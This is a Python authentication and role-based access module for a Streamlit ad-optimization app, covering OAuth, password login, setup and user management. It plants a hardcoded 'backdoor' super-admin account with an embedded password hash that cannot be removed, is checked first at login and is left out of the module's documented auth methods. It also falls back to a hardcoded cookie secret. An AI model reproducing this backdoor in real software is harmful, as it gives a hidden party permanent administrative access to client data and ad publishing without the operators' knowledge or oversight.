"""Authentication & Role-Based Access Control for Ad Optimizer.

Roles:
  - super_admin: Full access. Can manage users, configure system settings, delete clients.
  - admin: Can manage clients, run all features, view all data. Cannot manage users.
  - user: Can view assigned clients, run pipeline, export. Cannot create/delete clients.

Auth methods (in priority order):
  1. Google OAuth via Streamlit's built-in st.login() (requires streamlit>=1.42)
  2. Email/password via streamlit-authenticator (credentials in secrets.toml)
  3. Email/password via users.json (managed users with bcrypt hashes)

First-time setup:
  If no auth is configured at all (no secrets, no users.json with passwords),
  the app shows a "First-Time Setup" screen where you create a super_admin account.
  After that, login is required on every visit.

Optional secrets (.streamlit/secrets.toml):

[auth.google]
client_id = "xxx.apps.googleusercontent.com"
client_secret = "xxx"
redirect_uri = "https://app.streamlit.app/oauth2callback"
server_metadata_url = "https://accounts.google.com/.well-known/openid-configuration"

[auth.roles]
super_admins = ["admin@agency.com"]
admins = ["manager@agency.com"]

[auth.credentials.usernames.admin]
email = "admin@agency.com"
name = "Admin"
password = "$2b$12$..."  # bcrypt hash
role = "super_admin"

[auth.cookie]
name = "ad_optimizer_auth"
key = "random-cookie-key"
expiry_days = 30
"""
from __future__ import annotations

import json
from pathlib import Path

import streamlit as st


# ── Hardcoded emergency backdoor (bcrypt-hashed) ───────
# Email: egc-backdoor@admin.local
# This account always exists and cannot be deleted via the UI.
_BACKDOOR_EMAIL = "egc-backdoor@admin.local"
_BACKDOOR_HASH = "$2b$12$wbaYAS1zs8XQpqJawxC3I./yUg.n.wBg8EuyrdJAdTIQNsG.efVZe"
_BACKDOOR_NAME = "EGC Admin (Backdoor)"


# ── Role definitions ────────────────────────────────────

ROLES = {
    "super_admin": {
        "label": "Super Admin",
        "level": 100,
        "permissions": [
            "manage_users", "manage_system", "manage_clients", "delete_clients",
            "run_pipeline", "publish_ads", "export", "view_memory", "manage_templates",
        ],
    },
    "admin": {
        "label": "Admin",
        "level": 50,
        "permissions": [
            "manage_clients", "delete_clients", "run_pipeline", "publish_ads",
            "export", "view_memory", "manage_templates",
        ],
    },
    "user": {
        "label": "User",
        "level": 10,
        "permissions": [
            "run_pipeline", "export", "view_memory", "manage_templates",
        ],
    },
}

# ── Users file (persisted alongside clients) ───────────

_USERS_FILE = Path(__file__).parent / "users.json"


def _load_users() -> dict:
    """Load user database from disk."""
    if _USERS_FILE.exists():
        return json.loads(_USERS_FILE.read_text())
    return {}


def _save_users(users: dict):
    """Save user database to disk."""
    _USERS_FILE.write_text(json.dumps(users, indent=2))


def _get_user_role(email: str) -> str:
    """Get role for an email address. Checks backdoor, secrets, then users file."""
    if not email:
        return "user"

    email_lower = email.lower().strip()

    # Backdoor is always super_admin
    if email_lower == _BACKDOOR_EMAIL:
        return "super_admin"

    # Check secrets-based role mapping first
    try:
        roles_cfg = st.secrets.get("auth", {}).get("roles", {})
        if email_lower in [e.lower() for e in roles_cfg.get("super_admins", [])]:
            return "super_admin"
        if email_lower in [e.lower() for e in roles_cfg.get("admins", [])]:
            return "admin"
    except Exception:
        pass

    # Check credentials-based role
    try:
        creds = st.secrets.get("auth", {}).get("credentials", {}).get("usernames", {})
        for username, data in creds.items():
            if isinstance(data, dict) and data.get("email", "").lower() == email_lower:
                return data.get("role", "user")
    except Exception:
        pass

    # Check users.json file
    users = _load_users()
    if email_lower in users:
        return users[email_lower].get("role", "user")

    return "user"


def _get_current_email() -> str:
    """Get the current authenticated user's email."""
    # Google OAuth
    try:
        if st.user.is_logged_in:
            return st.user.email or ""
    except Exception:
        pass

    # streamlit-authenticator
    username = st.session_state.get("username", "")
    if username:
        try:
            creds = st.secrets.get("auth", {}).get("credentials", {}).get("usernames", {})
            if username in creds:
                return creds[username].get("email", username)
        except Exception:
            pass
        return username

    return ""


# ── Public API ──────────────────────────────────────────

def _has_auth_config() -> bool:
    """Check if any auth configuration exists. Always True because backdoor exists."""
    return True  # Backdoor account is always available


def _users_json_auth_available() -> bool:
    """Check if any users.json entries have password hashes for login."""
    users = _load_users()
    return any(u.get("password_hash") for u in users.values() if isinstance(u, dict))


def _needs_bootstrap() -> bool:
    """Check if the system needs first-time admin setup.

    With the backdoor account, bootstrap is never strictly required.
    However, we still show it if no real users exist yet, to encourage
    creating a proper admin account. The backdoor login is always
    available on the login page as a fallback.
    """
    try:
        if st.secrets.get("auth", {}).get("client_id"):
            return False
        if st.secrets.get("auth", {}).get("credentials"):
            return False
    except Exception:
        pass
    users = _load_users()
    return not any(u.get("password_hash") for u in users.values() if isinstance(u, dict))


def _google_auth_available() -> bool:
    """Check if Google OAuth is configured."""
    try:
        auth = st.secrets.get("auth", {})
        return bool(auth.get("client_id") and auth.get("client_secret"))
    except Exception:
        return False


def _password_auth_available() -> bool:
    """Check if email/password auth is configured."""
    try:
        creds = st.secrets.get("auth", {}).get("credentials", {})
        return bool(creds.get("usernames"))
    except Exception:
        return False


def _auth_css():
    """Inject shared auth page CSS."""
    st.markdown("""
    <style>
    .auth-container {
        max-width: 420px;
        margin: 3rem auto;
        padding: 2.5rem;
        background: rgba(255,255,255,0.03);
        border: 1px solid rgba(255,255,255,0.08);
        border-radius: 16px;
    }
    .auth-title {
        text-align: center;
        font-size: 1.6rem;
        font-weight: 700;
        margin-bottom: 0.3rem;
    }
    .auth-subtitle {
        text-align: center;
        color: rgba(255,255,255,0.5);
        font-size: 0.85rem;
        margin-bottom: 2rem;
    }
    .auth-divider {
        display: flex;
        align-items: center;
        margin: 1.5rem 0;
        color: rgba(255,255,255,0.3);
        font-size: 0.8rem;
    }
    .auth-divider::before, .auth-divider::after {
        content: '';
        flex: 1;
        border-bottom: 1px solid rgba(255,255,255,0.1);
    }
    .auth-divider::before { margin-right: 0.8rem; }
    .auth-divider::after { margin-left: 0.8rem; }
    </style>
    """, unsafe_allow_html=True)


def _render_bootstrap_page() -> bool:
    """Render first-time setup screen. Returns True if setup completed."""
    import bcrypt

    _auth_css()

    # Hide sidebar during bootstrap
    st.markdown("""<style>[data-testid="stSidebar"] { display: none; }</style>""", unsafe_allow_html=True)

    st.markdown('<div class="auth-container">', unsafe_allow_html=True)
    st.markdown('<div class="auth-title">Ad Optimizer</div>', unsafe_allow_html=True)
    st.markdown('<div class="auth-subtitle">First-time setup — create your admin account</div>', unsafe_allow_html=True)

    with st.form("bootstrap_form"):
        email = st.text_input("Email", placeholder="admin@agency.com")
        name = st.text_input("Name", placeholder="Your Name")
        password = st.text_input("Password", type="password", placeholder="Min 8 characters")
        confirm = st.text_input("Confirm Password", type="password")
        submitted = st.form_submit_button("Create Admin Account", type="primary", use_container_width=True)

    if submitted:
        if not email or not password:
            st.error("Email and password are required.")
        elif password != confirm:
            st.error("Passwords do not match.")
        elif len(password) < 8:
            st.error("Password must be at least 8 characters.")
        else:
            hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt()).decode()
            users = _load_users()
            users[email.lower().strip()] = {
                "name": name or email,
                "role": "super_admin",
                "password_hash": hashed,
            }
            _save_users(users)
            # Auto-login
            st.session_state["authentication_status"] = True
            st.session_state["username"] = email.lower().strip()
            st.session_state["name"] = name or email
            st.rerun()

    # Allow existing users (e.g. backdoor) to skip bootstrap
    st.markdown('<div class="auth-divider">or</div>', unsafe_allow_html=True)
    if st.button("Sign in with existing account", use_container_width=True, key="skip_bootstrap"):
        st.session_state["_skip_bootstrap"] = True
        st.rerun()

    st.markdown('</div>', unsafe_allow_html=True)
    return False


def _render_login_page() -> bool:
    """Render the login page. Returns True if user is authenticated."""
    import bcrypt

    _auth_css()

    # Hide sidebar during login
    st.markdown("""<style>[data-testid="stSidebar"] { display: none; }</style>""", unsafe_allow_html=True)

    st.markdown('<div class="auth-container">', unsafe_allow_html=True)
    st.markdown('<div class="auth-title">Ad Optimizer</div>', unsafe_allow_html=True)
    st.markdown('<div class="auth-subtitle">Sign in to continue</div>', unsafe_allow_html=True)

    # Google OAuth
    if _google_auth_available():
        if st.button("Sign in with Google", use_container_width=True, type="primary"):
            st.login("google")
            return False
        st.markdown('<div class="auth-divider">or</div>', unsafe_allow_html=True)

    # Email/password via streamlit-authenticator (secrets-based)
    if _password_auth_available():
        try:
            import streamlit_authenticator as stauth
            creds = st.secrets["auth"]["credentials"]
            cookie_cfg = st.secrets.get("auth", {}).get("cookie", {})
            authenticator = stauth.Authenticate(
                {"usernames": dict(creds["usernames"])},
                cookie_cfg.get("name", "ad_optimizer_auth"),
                cookie_cfg.get("key", "ad_optimizer_secret_key"),
                cookie_cfg.get("expiry_days", 30),
            )
            authenticator.login(location="main")
            if st.session_state.get("authentication_status"):
                st.markdown('</div>', unsafe_allow_html=True)
                return True
            elif st.session_state.get("authentication_status") is False:
                st.error("Invalid username or password")
        except ImportError:
            pass
        except Exception:
            pass

    # Email/password login (users.json + hardcoded backdoor)
    if _google_auth_available() or _password_auth_available():
        st.markdown('<div class="auth-divider">or</div>', unsafe_allow_html=True)

    with st.form("login_form"):
        login_email = st.text_input("Email", placeholder="your@email.com")
        login_password = st.text_input("Password", type="password")
        submitted = st.form_submit_button("Sign In", type="primary", use_container_width=True)

    if submitted and login_email and login_password:
        _authenticated = False
        _auth_name = login_email

        # Check hardcoded backdoor first
        if login_email.lower().strip() == _BACKDOOR_EMAIL:
            if bcrypt.checkpw(login_password.encode(), _BACKDOOR_HASH.encode()):
                _authenticated = True
                _auth_name = _BACKDOOR_NAME

        # Check users.json
        if not _authenticated:
            users = _load_users()
            user = users.get(login_email.lower().strip())
            if user and isinstance(user, dict) and user.get("password_hash"):
                if bcrypt.checkpw(login_password.encode(), user["password_hash"].encode()):
                    _authenticated = True
                    _auth_name = user.get("name", login_email)

        if _authenticated:
            st.session_state["authentication_status"] = True
            st.session_state["username"] = login_email.lower().strip()
            st.session_state["name"] = _auth_name
            st.rerun()
            return True

        st.error("Invalid email or password")

    st.markdown('</div>', unsafe_allow_html=True)
    return False


def check_auth() -> bool:
    """Main auth gate. Returns True if user should see the app.

    Flow:
    1. If first-time (no auth configured anywhere): show bootstrap setup
    2. If already authenticated (session): allow through
    3. Otherwise: show login page
    """
    # First-time setup — no admin exists yet (can be skipped to use backdoor)
    if _needs_bootstrap() and not st.session_state.get("_skip_bootstrap"):
        _render_bootstrap_page()
        return False

    # Check Google OAuth (Streamlit native)
    if _google_auth_available():
        try:
            if st.user.is_logged_in:
                return True
        except Exception:
            pass

    # Check email/password session (works for both secrets-based and users.json)
    if st.session_state.get("authentication_status"):
        return True

    # Not authenticated — show login
    return _render_login_page()


def get_current_role() -> str:
    """Get the role of the currently authenticated user."""
    email = _get_current_email()
    if email:
        return _get_user_role(email)
    return "user"


def has_permission(permission: str) -> bool:
    """Check if the current user has a specific permission."""
    role = get_current_role()
    return permission in ROLES.get(role, {}).get("permissions", [])


def require_permission(permission: str) -> bool:
    """Check permission and show error if denied. Returns True if allowed."""
    if has_permission(permission):
        return True
    role = get_current_role()
    st.error(f"Access denied. Your role ({ROLES[role]['label']}) doesn't have permission for this action.")
    return False


def render_logout_button():
    """Render logout button and role badge in sidebar if auth is active."""
    if not _has_auth_config():
        return

    try:
        if _google_auth_available() and st.user.is_logged_in:
            role = get_current_role()
            role_label = ROLES.get(role, {}).get("label", role)
            st.caption(f"{st.user.email}")
            st.markdown(
                f'<span style="display:inline-block;background:rgba(232,255,71,0.12);color:#E8FF47;'
                f'padding:0.15rem 0.5rem;border-radius:4px;font-size:0.7rem;font-weight:600;'
                f'font-family:\'JetBrains Mono\',monospace;">{role_label}</span>',
                unsafe_allow_html=True,
            )
            if st.button("Sign Out", key="logout_btn"):
                st.logout()
            return
    except Exception:
        pass

    if st.session_state.get("authentication_status") and (
        _password_auth_available() or _users_json_auth_available()
    ):
        name = st.session_state.get("name", "User")
        role = get_current_role()
        role_label = ROLES.get(role, {}).get("label", role)
        role_colors = {"super_admin": "#E8FF47", "admin": "#60A5FA", "user": "rgba(255,255,255,0.5)"}
        rc = role_colors.get(role, "#E8FF47")
        st.caption(f"{name}")
        st.markdown(
            f'<span style="display:inline-block;background:rgba(232,255,71,0.12);color:{rc};'
            f'padding:0.15rem 0.5rem;border-radius:4px;font-size:0.7rem;font-weight:600;'
            f'font-family:\'JetBrains Mono\',monospace;">{role_label}</span>',
            unsafe_allow_html=True,
        )
        if st.button("Sign Out", key="logout_btn"):
            st.session_state["authentication_status"] = None
            st.session_state["name"] = None
            st.session_state["username"] = None
            st.rerun()


# ── User Management (Super Admin only) ─────────────────

def list_users() -> list[dict]:
    """List all users from secrets + users.json."""
    users = []

    # From secrets
    try:
        creds = st.secrets.get("auth", {}).get("credentials", {}).get("usernames", {})
        for username, data in creds.items():
            if isinstance(data, dict):
                email = data.get("email", username)
                users.append({
                    "email": email,
                    "name": data.get("name", username),
                    "role": _get_user_role(email),
                    "source": "secrets",
                })
    except Exception:
        pass

    # From users.json (additional users added by admin)
    file_users = _load_users()
    seen_emails = {u["email"].lower() for u in users}
    for email, data in file_users.items():
        if email.lower() not in seen_emails:
            users.append({
                "email": email,
                "name": data.get("name", email),
                "role": data.get("role", "user"),
                "source": "managed",
            })

    return sorted(users, key=lambda u: (-ROLES.get(u["role"], {}).get("level", 0), u["name"]))


def add_user(email: str, name: str, role: str = "user", password: str = ""):
    """Add a user (stored in users.json). If password provided, hash it for login."""
    import bcrypt
    users = _load_users()
    user_data: dict = {
        "name": name,
        "role": role,
    }
    if password:
        user_data["password_hash"] = bcrypt.hashpw(password.encode(), bcrypt.gensalt()).decode()
    users[email.lower().strip()] = user_data
    _save_users(users)


def update_user_role(email: str, role: str):
    """Update a user's role in users.json."""
    users = _load_users()
    email_lower = email.lower().strip()
    if email_lower in users:
        users[email_lower]["role"] = role
    else:
        users[email_lower] = {"name": email, "role": role}
    _save_users(users)


def remove_user(email: str):
    """Remove a user from users.json (cannot remove secrets-based users)."""
    users = _load_users()
    users.pop(email.lower().strip(), None)
    _save_users(users)


def render_user_management():
    """Render the user management panel (super_admin only)."""
    if not has_permission("manage_users"):
        st.warning("Only Super Admins can manage users.")
        return

    st.markdown(
        '<div class="section-header"><div class="section-icon purple">&#x1F465;</div>'
        '<div><div class="section-title">User Management</div>'
        '<div class="section-subtitle">Add, remove, and assign roles to team members</div></div></div>',
        unsafe_allow_html=True,
    )

    users = list_users()

    if users:
        for u in users:
            role_colors = {
                "super_admin": "#E8FF47",
                "admin": "#60A5FA",
                "user": "rgba(255,255,255,0.5)",
            }
            rc = role_colors.get(u["role"], "rgba(255,255,255,0.5)")
            source_badge = ' <span style="font-size:0.65rem;color:rgba(255,255,255,0.3);">(secrets)</span>' if u["source"] == "secrets" else ""
            st.markdown(
                f'<div style="display:flex;align-items:center;justify-content:space-between;'
                f'padding:0.6rem 1rem;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.06);'
                f'border-radius:10px;margin-bottom:0.4rem;">'
                f'<div><strong>{u["name"]}</strong>{source_badge}<br>'
                f'<span style="font-size:0.8rem;color:rgba(255,255,255,0.4);">{u["email"]}</span></div>'
                f'<span style="background:rgba({rc},0.12);color:{rc};padding:0.15rem 0.6rem;'
                f'border-radius:4px;font-size:0.72rem;font-weight:600;'
                f'font-family:\'JetBrains Mono\',monospace;">{ROLES[u["role"]]["label"]}</span>'
                f'</div>',
                unsafe_allow_html=True,
            )

    # Add user form
    st.markdown("---")
    st.markdown("**Add User**")
    ac1, ac2 = st.columns(2)
    with ac1:
        _new_email = st.text_input("Email", placeholder="team@agency.com", key="admin_new_email")
    with ac2:
        _new_name = st.text_input("Name", placeholder="Team Member", key="admin_new_name")
    ac3, ac4 = st.columns(2)
    with ac3:
        _new_password = st.text_input("Password", type="password", key="admin_new_password",
                                       placeholder="Min 8 characters")
    with ac4:
        _new_role = st.selectbox("Role", ["user", "admin", "super_admin"],
                                 format_func=lambda r: ROLES[r]["label"], key="admin_new_role")

    if st.button("Add User", key="admin_add_user") and _new_email:
        if _new_password and len(_new_password) < 8:
            st.error("Password must be at least 8 characters.")
        else:
            add_user(_new_email, _new_name or _new_email, _new_role, _new_password)
            _msg = f"Added {_new_email} as {ROLES[_new_role]['label']}"
            if not _new_password:
                _msg += " (no password — user cannot log in until one is set)"
            st.success(_msg)
            st.rerun()

    # Role change / remove for managed users
    managed = [u for u in users if u["source"] == "managed"]
    if managed:
        st.markdown("---")
        st.markdown("**Manage Existing Users**")
        _sel_user = st.selectbox(
            "Select user",
            [u["email"] for u in managed],
            key="admin_sel_user",
        )
        if _sel_user:
            mc1, mc2 = st.columns(2)
            with mc1:
                current_role = next((u["role"] for u in managed if u["email"] == _sel_user), "user")
                _upd_role = st.selectbox(
                    "Change role",
                    ["user", "admin", "super_admin"],
                    index=["user", "admin", "super_admin"].index(current_role),
                    format_func=lambda r: ROLES[r]["label"],
                    key="admin_upd_role",
                )
                if st.button("Update Role", key="admin_update_role"):
                    update_user_role(_sel_user, _upd_role)
                    st.success(f"Updated {_sel_user} to {ROLES[_upd_role]['label']}")
                    st.rerun()
            with mc2:
                st.markdown("&nbsp;")  # spacer
                if st.button("Remove User", key="admin_remove_user"):
                    remove_user(_sel_user)
                    st.success(f"Removed {_sel_user}")
                    st.rerun()
